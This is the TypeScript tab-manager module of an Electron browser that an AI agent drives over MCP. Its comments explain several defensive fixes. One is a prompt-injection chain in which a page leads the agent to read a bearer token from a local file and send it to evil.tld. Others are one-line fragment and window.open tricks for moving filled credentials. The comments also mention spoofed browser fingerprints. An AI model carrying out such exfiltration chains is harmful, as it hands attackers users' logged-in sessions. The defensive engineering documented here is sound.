import { EventEmitter } from 'node:events';
import { join } from 'node:path';
import { WebContentsView, type BaseWindow, type Session } from 'electron';
import type { ContainerId, LoadState, TabId, TabInfo } from '@shared/types';
import { containers } from '@privacy/containers';
import { applyUaProfile, buildUaProfile, type UaProfile } from '@privacy/useragent.js';
import { setWindowOffset } from '@core/snapshot/act.js';
import { hasNeedles } from '@core/snapshot/engine.js';
import { originOf } from '@shared/origin.js';

/** Height of the browser chrome (tab strip + address bar), in CSS px. */
export const CHROME_HEIGHT = 88;

/** Built once from the real Chromium version; see privacy/useragent.ts. */
let cachedUa: UaProfile | null = null;
function uaProfile(): UaProfile {
  cachedUa ??= buildUaProfile(process.versions.chrome ?? '150.0.0.0');
  return cachedUa;
}

interface TabRecord {
  id: TabId;
  view: WebContentsView;
  container: ContainerId;
  agentOwned: boolean;
  blockedCount: number;
  loadState: LoadState;
  /** Resolves when the in-flight navigation settles. */
  pendingNav: { resolve: () => void; timer: NodeJS.Timeout } | null;
  /**
   * Every origin whose filled values this tab's content could be carrying,
   * OTHER than the one it happens to be on right now.
   *
   * COVERAGE FOLLOWS THE VALUE, NOT THE TAB'S PRESENT LOCATION. That sentence
   * is the whole design, and getting it wrong twice is what put two findings on
   * the same mechanism in one gate (`docs/design/sink-closure-review-2.md`).
   *
   * Two ways a value gets into a tab that was never filled, and this set is
   * seeded on both:
   *
   *  1. **The opener.** A page holding a credential calls `window.open` with
   *     the value in the URL. Aperture creates AND ACTIVATES that tab, so the
   *     agent's next unqualified `browser_snapshot` reads it. The new tab is on
   *     an origin that was never filled — but the page that put the value there
   *     is known. Seeded with the opener's ENTIRE SCOPE, not its current origin:
   *     inheriting the current origin only made the property survive one hop, so
   *     a two-hop chain (filled → A → B) left B uncovered (F-D). Inheriting the
   *     scope makes it transitive by construction, because the opener's set
   *     already contains ITS opener's scope and its own priors.
   *
   *  2. **Where this tab came from.** The tab navigates ITSELF across an origin
   *     boundary carrying the value —
   *     `location.href = 'http://third-party/inert.html#' + password`. One line,
   *     no popup, no opener, and the target need not be hostile or even have
   *     script: a fragment is never sent to a server, so nothing is exfiltrated;
   *     the value simply moved from a place the redactor covers to a place it
   *     did not (F-E). The prior origin is added on every document-replacing
   *     navigation.
   *
   * ADDED TO ON EVERY CROSSING, AND PRUNED ONLY WHEN AN ENTRY CAN NEVER MATTER
   * AGAIN — 2026-08-05, third gate. An origin whose needles are gone (the TTL
   * ran out, the fill was refused, the vault locked) contributes nothing to
   * `needlesFor` and cannot begin to contribute later: an origin joins this set
   * at the moment the tab LEAVES it, and a value registered after that moment is
   * not in this tab's content. `engine.hasNeedles` is the one question that
   * decides it, and it answers a boolean rather than handing anything back.
   *
   * That is not a behaviour change and it is not presented as one. It is what
   * makes the unboundedness argument below TRUE rather than merely affordable:
   * the set is now bounded by the origins that currently matter, not by every
   * origin the tab has ever visited.
   *
   * A tab that leaves a filled origin stays scrubbed against
   * it for as long as that origin has needles, which is the over-redaction this
   * module accepts everywhere else: cosmetic markers on unrelated strings,
   * bounded by the needle TTL rather than by this set — an origin with no live
   * needles contributes nothing to `needlesFor`, so a stale entry costs a map
   * lookup and nothing else.
   *
   * Unbounded in size, and that is deliberate rather than overlooked: an entry
   * is one short string per DISTINCT origin the tab has visited, and any cap
   * would have to evict something, at which point the mechanism could silently
   * lose the one origin that mattered. A tab that visits every port on loopback
   * costs about a megabyte; a tab that loses coverage costs the credential.
   */
  carriedOrigins: Set<string>;
  /**
   * The origin of the document currently committed here, so that the NEXT
   * document-replacing navigation knows what this tab is leaving.
   *
   * Kept rather than read at the moment of the event because by the time
   * `did-navigate` fires the new document is already committed and
   * `getURL()` answers the destination, not the source.
   */
  lastOrigin: string | null;
}

let tabSeq = 0;

/**
 * Owns the set of open tabs and their WebContentsViews.
 *
 * Both the human (via the chrome UI) and the agent (via MCP) drive this same
 * manager — there is no separate "automation browser". That is the point: the
 * agent works in the browser you are actually using, with your sessions and
 * your containers, and you can watch it happen.
 */
export class TabManager extends EventEmitter {
  private tabs = new Map<TabId, TabRecord>();
  private order: TabId[] = [];
  private activeId: TabId | null = null;
  private bounds = { width: 1280, height: 800 };

  constructor(private window: BaseWindow) {
    super();
    this.window.on('resize', () => this.layout());
  }

  // -- lifecycle ------------------------------------------------------------

  create(opts: {
    url?: string;
    container?: ContainerId;
    agentOwned?: boolean;
    activate?: boolean;
    /**
     * The opener's ORIGIN SCOPE, not its current origin. Set only by the
     * window-open handler; see `TabRecord.carriedOrigins`.
     */
    inherits?: string[];
  } = {}): TabId {
    const id = `t${++tabSeq}`;
    const containerId = opts.container ?? containers.defaultId();
    const session = containers.sessionFor(containerId);

    const view = new WebContentsView({
      webPreferences: {
        session,
        preload: join(__dirname, '../preload/page.cjs'),
        contextIsolation: true,
        nodeIntegration: false,
        sandbox: true,
        // Pages must not be able to reach into other tabs or the chrome UI.
        webSecurity: true,
        // Each tab gets its own renderer process so a hostile page cannot
        // observe or corrupt sibling tabs' memory.
        partition: undefined,
      },
    });

    const rec: TabRecord = {
      id,
      view,
      container: containerId,
      agentOwned: opts.agentOwned ?? false,
      blockedCount: 0,
      loadState: 'idle',
      pendingNav: null,
      carriedOrigins: new Set(opts.inherits ?? []),
      lastOrigin: null,
    };
    this.tabs.set(id, rec);
    this.order.push(id);
    this.wire(rec);

    // Apply the coherent UA profile before the first navigation, so the very
    // first request already carries matching client hints. Setting the UA
    // string alone leaves Sec-CH-UA absent, which is a louder tell than the
    // string itself.
    void applyUaProfile(view.webContents, uaProfile());

    this.window.contentView.addChildView(view);
    if (opts.activate !== false) this.activate(id);
    else view.setVisible(false);

    if (opts.url) void this.navigate(id, opts.url);

    this.emitChanged();
    return id;
  }

  close(id: TabId): void {
    const rec = this.tabs.get(id);
    if (!rec) return;

    this.window.contentView.removeChildView(rec.view);
    // close() on the webContents releases the renderer process.
    rec.view.webContents.close();

    this.tabs.delete(id);
    this.order = this.order.filter((t) => t !== id);

    if (this.activeId === id) {
      const next = this.order[this.order.length - 1] ?? null;
      this.activeId = null;
      if (next) this.activate(next);
    }
    this.emitChanged();
  }

  activate(id: TabId): void {
    if (!this.tabs.has(id)) return;
    if (this.activeId === id) return;

    const prev = this.activeId ? this.tabs.get(this.activeId) : null;
    if (prev) prev.view.setVisible(false);

    const rec = this.tabs.get(id)!;
    rec.view.setVisible(true);
    this.window.contentView.addChildView(rec.view); // raise to top
    this.activeId = id;
    this.layout();
    this.emitChanged();
  }

  // -- navigation -----------------------------------------------------------

  /**
   * Navigate and resolve when the page settles. Resolves on load, on failure,
   * or on timeout — never hangs, because an agent blocked forever on a
   * navigation is worse than one told the page is slow.
   */
  async navigate(id: TabId, url: string, timeoutMs = 30_000): Promise<void> {
    const rec = this.tabs.get(id);
    if (!rec) throw new Error(`no such tab: ${id}`);

    const target = normalizeUrl(url);
    // Enforced again here rather than trusting the caller: normalizeUrl is
    // exported and this is the only funnel into loadURL, so this is the last
    // place a bad scheme can be stopped.
    if (!isAllowedScheme(target)) {
      throw new Error(`refusing to navigate to a non-web URL: ${target.slice(0, 40)}`);
    }
    this.settlePending(rec);

    const settled = new Promise<void>((resolve) => {
      const timer = setTimeout(() => {
        rec.pendingNav = null;
        resolve();
      }, timeoutMs);
      rec.pendingNav = { resolve, timer };
    });

    rec.loadState = 'loading';
    rec.blockedCount = 0;
    this.emitChanged();

    try {
      await rec.view.webContents.loadURL(target);
    } catch (err) {
      // loadURL rejects on things like ERR_ABORTED, which fires routinely for
      // redirects and for navigations the page itself supersedes. The
      // did-fail-load handler is the authority on real failures.
      void err;
    }
    await settled;
  }

  private settlePending(rec: TabRecord): void {
    if (!rec.pendingNav) return;
    clearTimeout(rec.pendingNav.timer);
    rec.pendingNav.resolve();
    rec.pendingNav = null;
  }

  goBack(id: TabId): void {
    const wc = this.tabs.get(id)?.view.webContents;
    if (wc?.navigationHistory.canGoBack()) wc.navigationHistory.goBack();
  }

  goForward(id: TabId): void {
    const wc = this.tabs.get(id)?.view.webContents;
    if (wc?.navigationHistory.canGoForward()) wc.navigationHistory.goForward();
  }

  reload(id: TabId): void {
    this.tabs.get(id)?.view.webContents.reload();
  }

  stop(id: TabId): void {
    this.tabs.get(id)?.view.webContents.stop();
  }

  // -- accessors ------------------------------------------------------------

  get active(): TabId | null {
    return this.activeId;
  }

  has(id: TabId): boolean {
    return this.tabs.has(id);
  }

  webContents(id: TabId) {
    const rec = this.tabs.get(id);
    if (!rec) throw new Error(`no such tab: ${id}`);
    return rec.view.webContents;
  }

  sessionFor(id: TabId): Session {
    return this.webContents(id).session;
  }

  noteBlocked(id: TabId, n = 1): void {
    const rec = this.tabs.get(id);
    if (!rec) return;
    rec.blockedCount += n;
  }

  info(id: TabId): TabInfo | null {
    const rec = this.tabs.get(id);
    if (!rec) return null;
    const wc = rec.view.webContents;
    return {
      id: rec.id,
      url: wc.getURL(),
      title: wc.getTitle(),
      favicon: null,
      loadState: rec.loadState,
      canGoBack: wc.navigationHistory.canGoBack(),
      canGoForward: wc.navigationHistory.canGoForward(),
      container: rec.container,
      agentOwned: rec.agentOwned,
      blockedCount: rec.blockedCount,
      audible: wc.isCurrentlyAudible(),
      muted: wc.isAudioMuted(),
    };
  }

  list(): TabInfo[] {
    return this.order
      .map((id) => this.info(id))
      .filter((t): t is TabInfo => t !== null);
  }

  /**
   * Every origin whose filled values this tab's content could be carrying.
   *
   * The answer `engine.ts`'s `OriginScope` needs, and the only place that knows
   * it: where the tab IS, plus everything it CARRIES — who opened it (and who
   * opened them), and every origin it has left. See `TabRecord.carriedOrigins`
   * for why those two are one set and why it only grows.
   *
   * Deliberately not on `TabInfo` — this is redaction scope, not something the
   * renderer or the agent has any business reading.
   */
  originScope(id: TabId): string[] {
    const rec = this.tabs.get(id);
    if (!rec) return [];
    const here = originOf(rec.view.webContents.getURL());
    const out = here ? [here] : [];
    for (const o of rec.carriedOrigins) {
      // Pruned here rather than on a timer: this is the only place that reads
      // the set, so a dead entry is dropped at exactly the moment anybody would
      // have paid for it. See `TabRecord.carriedOrigins` for why an origin with
      // no live needles can never matter again.
      if (!hasNeedles(o)) {
        rec.carriedOrigins.delete(o);
        continue;
      }
      if (o !== here) out.push(o);
    }
    return out;
  }

  // -- internals ------------------------------------------------------------

  private wire(rec: TabRecord): void {
    const wc = rec.view.webContents;

    wc.on('did-start-loading', () => {
      rec.loadState = 'loading';
      this.emitChanged();
    });

    wc.on('did-stop-loading', () => {
      if (rec.loadState === 'loading') rec.loadState = 'complete';
      this.settlePending(rec);
      this.emitChanged();
    });

    wc.on('did-fail-load', (_e, code, desc, _url, isMainFrame) => {
      if (!isMainFrame) return;
      // -3 is ERR_ABORTED: a superseded navigation, not a failure.
      if (code === -3) return;
      rec.loadState = 'failed';
      this.emit('load-failed', rec.id, code, desc);
      this.settlePending(rec);
      this.emitChanged();
    });

    wc.on('page-title-updated', () => this.emitChanged());
    wc.on('did-navigate', () => {
      // The document was replaced.
      //
      // REDACTION SCOPE FIRST, before anything downstream observes the tab.
      // A page that already holds a credential can move it across an origin
      // boundary the tab takes with it, in one line and with nothing leaving
      // the machine:
      //
      //     location.href = 'http://any-third-party/inert.html#' + password
      //
      // The target need not be hostile, need not have script, and never
      // receives the fragment — measured: the third-party server logged a
      // request for `/inert.html` and nothing else. What moved was not the
      // secret's location on the network, it was the secret's location relative
      // to the REDACTOR, and `Snapshot.url` then carried it verbatim into the
      // act result, the next snapshot and the tab listing
      // (`docs/design/sink-closure-review-2.md` F-E).
      //
      // So the origin being LEFT joins this tab's carried set. Kept even if the
      // tab later comes back or moves on again, for the same reason the opener
      // scope is kept: coverage follows the value.
      const now = originOf(wc.getURL());
      if (rec.lastOrigin && rec.lastOrigin !== now) {
        rec.carriedOrigins.add(rec.lastOrigin);
      }
      rec.lastOrigin = now;

      this.emit('navigated', rec.id);
      this.emit('document-navigated', rec.id);
      this.emitChanged();
    });
    wc.on('did-navigate-in-page', () => {
      // pushState or a hash change: same document, same DOM, same values.
      this.emit('navigated', rec.id);
      this.emitChanged();
    });

    // A page asking to open a window gets a tab in the *same* container, so
    // popups cannot be used to escape into the default cookie jar.
    //
    // THE SCHEME IS CHECKED HERE AND NOT LEFT TO `normalizeUrl`, and that is a
    // network finding rather than a tidiness one. `normalizeUrl` answers a
    // disallowed scheme with `searchFor(s)` — `duckduckgo.com/?q=<the whole
    // string>` — which is the right answer for a HUMAN typing "weather" into
    // the address bar and a catastrophic one for a page choosing the bytes.
    // Measured on the shipped build: a page running
    //
    //     window.open('mailto:nobody@example.invalid?subject=' + MARKER)
    //
    // produced a tab at `https://duckduckgo.com/?q=mailto%3A…%3FMARKER`, so
    // Aperture put a page-chosen string on the network, to a third-party server
    // the page never named. Substituting a filled credential for the marker is
    // the same line. That matters most for the exact adversary the needles were
    // built for — injected script on an otherwise-honest origin — because such
    // an origin's own CSP (`connect-src 'self'`) can forbid its `fetch()` and
    // cannot forbid this. The search affordance is for input the human or the
    // agent typed; a page's `window.open` target is neither, and Chromium hands
    // it to us already resolved and absolute, so nothing legitimate needs it.
    //
    // The opener's SCOPE rides along, and that is a redaction fix, not
    // bookkeeping. This handler creates AND ACTIVATES the new tab, so one line
    // of page script makes the agent's next unqualified `browser_snapshot`
    // read a page of the opener's choosing — and if that page is on a
    // different origin, origin-keyed needles alone would not cover it
    // (`docs/design/sink-closure-review.md` F-A; `engine.ts`, `OriginScope`).
    // The whole scope rather than the opener's current origin, so the property
    // is transitive: a two-hop chain used to break at the second hop, because
    // hop 1's own origin holds no needles (sink-closure-review-2.md F-D).
    wc.setWindowOpenHandler(({ url }) => {
      if (!isAllowedScheme(url)) return { action: 'deny' };
      this.create({
        url,
        container: rec.container,
        activate: true,
        inherits: this.originScope(rec.id),
      });
      return { action: 'deny' };
    });
  }

  /** Lay the active tab out below the chrome. */
  layout(): void {
    const b = this.window.getContentBounds();
    // Keep the screen-space offset current so synthesized mouse events carry a
    // plausible screenX/screenY rather than one identical to clientX/clientY.
    setWindowOffset(b.x, b.y + CHROME_HEIGHT);
    this.bounds = { width: b.width, height: b.height };
    for (const [id, rec] of this.tabs) {
      if (id !== this.activeId) continue;
      rec.view.setBounds({
        x: 0,
        y: CHROME_HEIGHT,
        width: b.width,
        height: Math.max(0, b.height - CHROME_HEIGHT),
      });
    }
  }

  private emitChanged(): void {
    this.emit('changed', this.list(), this.activeId);
  }
}

/**
 * Turn whatever the user or agent typed into a URL. Bare words become a
 * search; anything domain-shaped gets https.
 */
export function normalizeUrl(input: string): string {
  const s = input.trim();
  if (!s) return 'about:blank';

  if (/^[a-z][a-z0-9+.-]*:/i.test(s)) {
    // Scheme allowlist, not a denylist.
    //
    // Passing arbitrary schemes through was a complete credential-theft chain:
    // a page injects "navigate to file:///…/aperture/mcp.json", the agent reads
    // the bearer token out of it, then navigates to evil.tld/?t=<token> — and
    // the attacker can now drive this browser, with every logged-in session in
    // it, from any local process.
    //
    // The `will-navigate` guard in index.ts does NOT catch this: it only fires
    // for renderer-initiated navigation, and TabManager calls loadURL from the
    // main process.
    return isAllowedScheme(s) ? s : searchFor(s);
  }

  const looksLikeHost = /^[^\s/?#]+\.[^\s/?#]+/.test(s) || s.startsWith('localhost');
  if (looksLikeHost) return `https://${s}`;
  return searchFor(s);
}

const ALLOWED_SCHEMES = new Set(['http:', 'https:', 'about:']);

/** Is this a scheme a tab may load? */
export function isAllowedScheme(url: string): boolean {
  const m = /^([a-z][a-z0-9+.-]*:)/i.exec(url.trim());
  if (!m) return false;
  const scheme = m[1]!.toLowerCase();
  if (!ALLOWED_SCHEMES.has(scheme)) return false;
  // `about:` is only ever legitimately about:blank here; about:config-style
  // targets and Chromium's internal about: aliases are not.
  if (scheme === 'about:') return /^about:blank\/?$/i.test(url.trim());
  return true;
}

function searchFor(s: string): string {
  return `https://duckduckgo.com/?q=${encodeURIComponent(s)}`;
}
